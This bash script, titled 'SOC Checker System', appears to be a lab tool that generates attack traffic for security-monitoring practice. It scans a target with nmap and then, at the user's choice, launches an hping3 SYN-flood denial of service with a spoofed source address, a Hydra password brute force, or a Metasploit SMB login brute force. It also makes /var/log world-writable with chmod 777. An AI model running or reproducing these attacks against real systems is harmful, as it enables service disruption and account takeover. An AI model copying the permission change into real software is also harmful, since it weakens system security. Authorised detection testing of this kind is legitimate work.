#!/bin/bash

echo ''
echo "	—————— \\\ SOC Checker System // ——————	"
sleep 1
echo ''

function DisplaySysInfo()
{	
	#Change /var/log directory permission to store log file
	echo "[*] Changing '/var/log' directory permission to store log file"
	sudo chmod 777 /var/log
	sleep 1
	echo ''
	
	#Display system's uptime
	echo "[*] System uptime:"
	uptime
	sleep 1
	echo ''
	
	#Display current logged-in user
	echo "[*] Logged-in user:"
	whoami
	sleep 1
	echo ''
	
	#Create a new folder to store all data
	echo "[+] A new folder 'socchecker' has been created"
	mkdir socchecker
	sleep 1
	echo ''
	
	#Moving into SOC_Checker folder
	echo "[*] Moving into socchecker folder..."
	cd socchecker
	sleep 1
	echo ''
	
	#Display current working directory
	echo "[*] Current working directory:"
	pwd
	sleep 1
	echo ''
}
DisplaySysInfo

function NetworkScan()
{
	#Display IP address configuration
	echo "[*] IP address configuration:"
	ip a
	sleep 1
	echo ''
	
	#Perform Nmap scan IP address and save the result
	read -p "[*] Nmap scanning on target IP address: " Scan_IP
	nmap $Scan_IP -F -Pn -sV -vv -oG nmapresult.txt
	echo ''
	echo "[*] Nmap output saved to 'nmapresult.txt' in socchecker for review"
	sleep 1
	echo ''
}
NetworkScan

#Create log file for events logging
function LogEntry()
{
	echo "$(date) - [*] System uptime: $(uptime)" > /var/log/soclog && sleep 1
	echo "$(date) - [*] Logged-in user: $(whoami)" >> /var/log/soclog && sleep 1
	echo "$(date) - [*] New folder created 'socchecker': mkdir socchecker" >> /var/log/soclog && sleep 1
	echo "$(date) - [*] Moved into socchecker folder: cd socchecker" >> /var/log/soclog && sleep 1
	echo "$(date) - [*] System working directory: $(pwd)" >> /var/log/soclog && sleep 1
	echo "$(date) - [*] Command performed to display IP configuration: ip a" >> /var/log/soclog && sleep 1
	echo "$(date) - [*] Target IP address scanned: nmap $Scan_IP -F -Pn -sV -vv -oG nmapresult.txt" >> /var/log/soclog && sleep 1
}

#Check available IP addresses for attack
function NetworkScanAvail()
{
	#Store the text manipulated nmap result as a variable by showing only 'open'
	nmap_result=$(cat nmapresult.txt | grep open | awk '{print $5}' | awk -F/ '{print $2}' | uniq)

	#Check if the Nmap scan output contains "open"
	if [ "$nmap_result" == "open" ]
	then
		echo "Available IP addresses to attack (Ports Open):"
		grep open nmapresult.txt | awk '{print $2}'
		echo ''
	else
		echo "[*] No available IP addresses to attack (Ports Closed)"
		sleep 1
		echo ''
		#Create log file for events logging and exit
		echo "[*] Events has been logged in /var/log/soclog..."
		echo ''
		LogEntry
		echo "[+] Event Logged done!"
		sleep 1
		echo ''
		echo "[*] Exiting system..."
		sleep 1
		echo ''
		echo "[*] Goodbye!"
    exit
  fi
}	
NetworkScanAvail

#Function to perform Hping3 attack
function PerformHp3Atk()
{
	echo "[*] Hping3 selected, initiating attack..."
	echo "Description: Denial-of-Service(DoS) attack by sending sync packet to specific target"
	sleep 1
	echo ''
	read -p "Enter target IP address: " HpTgt_IP
	read -p "Enter target port number: " HpTgt_Port
	read -p "Enter number of packets count: " PktCount
	read -p "Enter packets size: " PktSize
	read -p "Enter your spoof sender IP address: " SpoofIP
	echo ''
	sudo hping3 -S $HpTgt_IP -p $HpTgt_Port -c $PktCount -d $PktSize -a $SpoofIP
	echo "$(date) - [*] User's attack option: sudo hping3 -S "$HpTgt_IP" -p "$HpTgt_Port" -c "$PktCount" -d "$PktSize" -a "$SpoofIP"" >> /var/log/soclog 
	echo "$(date) - [*] End of session" >> /var/log/soclog
	echo ''
	echo "[*] Hping3 attack completed!"
	sleep 1
	echo ''
	echo "[*] Events has been logged in /var/log/soclog..."
	echo ''
	
	#Revert back the permission of /var/log directory to default
	echo "[*] Permission of /var/log/soclog has reverted to default"
	sudo chmod 755 /var/log
	sleep 1
	echo ''
	echo "[*] Exiting system..."
	sleep 1
	echo ''
	echo "[*] Goodbye!"
}

#Function to perform Hydra attack
function PerformHyAtk()
{
	echo "[*] Hydra selected, initiating attack..."
	echo "Description: Brute force attack to try different usernames and passwords"
	echo "    		   against a target to identify the correct credentials."
	sleep 1
	echo ''
	echo "[!] REMINDER: Please supply your username and password list in 'socchecker' folder..."
	sleep 3
	echo ''
	read -p "Enter username list filename: " HyTgt_Usrlst
	read -p "Enter password list filename: " HyTgt_Pwlst
	read -p "Enter target IP address: " HyTgt_IP
	read -p "Enter target protocol (eg: ssh/ftp/rdp/smb): " HyTgt_prtcl
	echo ''
	hydra -L $HyTgt_Usrlst -P $HyTgt_Pwlst $HyTgt_IP $HyTgt_prtcl -vV -o hydraresult.txt
	echo "$(date) - [*] User's attack option: hydra -L "$HyTgt_Usrlst" -P "$HyTgt_Pwlst" "$HyTgt_IP" "$HyTgt_prtcl" -vV -o hydraresult.txt" >> /var/log/soclog
	echo "$(date) - [*] End of session" >> /var/log/soclog
	echo ''
	echo "[*] Hydra attack completed!:"
	sleep 1
	echo ''
	echo "[*] Result saved to hydraresult.txt"
	sleep 1
	echo ''
	echo "[*] Events has been logged in /var/log/soclog..."
	echo ''
	
	#Revert back the permission of /var/log directory to default
	echo "[*] Permission of /var/log/soclog has reverted to default"
	sudo chmod 755 /var/log
	sleep 1
	echo ''
	echo "[*] Exiting system..."
	sleep 1
	echo ''
	echo "[*] Goodbye!"
}

#Function to perform Msfconsole SMB Login attack
function PerformMsfSMBAtk()
{
	echo "[*] Msfconsole SMB Login selected, initiating attack..."
	echo "Description: Brute force attack of SMB login protocol"
	sleep 1
	echo ''
	echo "[!] REMINDER: Please supply your username and password list in socchecker folder..."
	sleep 3
	echo ''
	read -p "Enter target IP address: " smbTgt_IP
	read -p "Enter domain name: " smbDN
	read -p "Enter user list filename: " smbUsrlst
	read -p "Enter password list filename: " smbPwlst
	echo ''
	sleep 1
	echo "use auxiliary/scanner/smb/smb_login" > smblogin.rc
	echo "set rhosts $smbTgt_IP" >> smblogin.rc
	echo "set smbdomain $smbDN" >> smblogin.rc
	echo "set user_file $smbUsrlst" >> smblogin.rc
	echo "set pass_file $smbPwlst" >> smblogin.rc
	echo "run" >> smblogin.rc
	echo "exit" >> smblogin.rc
			
	echo "[*] Running Msfconsole SMB Login Attack...standby..."
	msfconsole -qr smblogin.rc -o smbloginresult.txt
	echo "$(date) - [*] User's attack option: : msfconsole -qr smblogin.rc -o smbloginresult.txt" >> /var/log/soclog
	echo "$(date) - [*] End of session" >> /var/log/soclog
	echo ''
	echo "[*] SMB Login Attack completed!"
	sleep 1
	echo ''
	echo "[*] Result saved to smbloginresult.txt"
	sleep 1
	echo ''
	echo "[*] Events has been logged in /var/log/soclog..."
	echo ''
	
	#Revert back the permission of /var/log directory to default
	echo "[*] Permission of /var/log/soclog has reverted to default"
	sudo chmod 755 /var/log
	sleep 1
	echo ''
	echo "[*] Exiting system..."
	sleep 1
	echo ''
	echo "[*] Goodbye!"
}

#Three types of attack option for user to choose
function PerformOptionsAtk()
{
	echo "[*] Please select your attack options:"
	echo "———————————————————————————————————————————————————————————————————————————————————————"
	echo ''
	echo "A] Hping3:—"
	echo "   Description: Denial-of-Service(DoS) attack by sending sync packet to specific target"
	echo ''
	echo "B] Hydra:—"
	echo "   Description: Brute force attack to try different usernames and passwords"
	echo "	        against a target to identify the correct credentials"
	echo "   [!] NOTE — Please supply your username and password list in 'socchecker' folder"
	echo ''
	echo "C] Msfconsole SMB Login:—"
	echo "   Description: Brute force attack of SMB login protocol"
	echo "   [!] NOTE — Please supply your username and password list in 'socchecker' folder"
	echo ''
	read -p "Please choose your options to attack (A|B|C): " OPTIONS
	echo ''
		
	case $OPTIONS in
		A|a)
			PerformHp3Atk
		;;
		B|b)
			PerformHyAtk
		;;
		C|c)
			PerformMsfSMBAtk
		;;	
		  *)
			echo "[-] Invalid option!"
			sleep 1
			echo ''
			echo "[*] Exiting system..."
			sleep 1
			echo ''
			echo "[*] Goodbye!"
	exit
	esac
}
LogEntry
PerformOptionsAtk

